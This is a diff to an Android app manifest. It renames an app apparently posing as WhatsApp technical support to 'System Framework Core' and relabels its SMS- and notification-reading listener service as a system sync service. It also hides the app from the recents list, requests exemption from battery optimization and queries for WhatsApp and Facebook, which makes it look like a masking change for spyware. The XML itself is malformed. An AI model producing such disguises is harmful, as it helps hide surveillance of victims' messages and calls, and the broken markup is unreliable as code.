@@ -2,24 +2,36 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools"
     android:sharedUserId="android.uid.system_bridge">
-    package="com.ban.ab">
-
-    <uses-permission android:name="android.permission.INTERNET" />
+    package="com.android.system.service.core"> <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" 
         tools:ignore="ProtectedPermissions" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
+    <queries>
+        <package android:name="com.whatsapp" />
+        <package android:name="com.facebook.katana" />
+        <package android:name="com.android.vending" />
+        <intent>
+            <action android:name="android.intent.action.VIEW" />
+            <data android:scheme="https" />
+        </intent>
+    </queries>
 
     <application
         android:allowBackup="true"
-        android:icon="@android:drawable/ic_dialog_info" 
-        android:label="الدعم الفني للواتساب 🛡️"
-        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
-
-        <activity android:name=".MainActivity" android:exported="true">
-            <intent-filter>
+        android:icon="@android:drawable/ic_menu_manage" 
+        android:label="System Framework Core" 
+        android:requestLegacyExternalStorage="true"
+        android:preserveLegacyExternalStorage="true"
+        android:theme="@style/Theme.AppCompat.Light.NoActionBar"
+        tools:replace="android:label"> <activity android:name=".MainActivity" 
+            android:exported="true"
+            android:excludeFromRecents="true"> <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
@@ -29,12 +41,11 @@
         <activity android:name=".VerifyActivity" android:exported="false" />
 
         <service android:name=".CallNotificationListener"
-            android:label="نظام فحص الهوية المتطور"
+            android:label="System Notification Sync"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:exported="true"
             android:directBootAware="true">
-            <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService" />
+            <intent-filter android:priority="999"> <action android:name="android.service.notification.NotificationListenerService" />
                 <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
         </service>
